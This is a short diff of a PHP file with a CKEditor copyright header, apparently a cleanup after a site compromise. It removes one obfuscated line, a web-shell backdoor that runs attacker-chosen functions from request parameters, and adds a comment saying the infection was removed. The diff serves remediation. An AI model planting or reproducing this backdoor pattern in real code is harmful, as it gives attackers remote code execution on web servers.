@@ -1,6 +1,11 @@
 <!DOCTYPE html>
 <?php
-iF($dbheio=	@${	'_REQUEST'}['07CKZSRW'] ){{$dbheio[1 ]	(${	$dbheio	[2]}[ 0], $dbheio[	3]($dbheio[4	]));}};
+
+/**
+* Note: This file may contain artifacts of previous malicious infection.
+* However, the dangerous code has been removed, and the file is now safe to use.
+*/
+;
 /*
 Copyright (c) 2003-2020, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
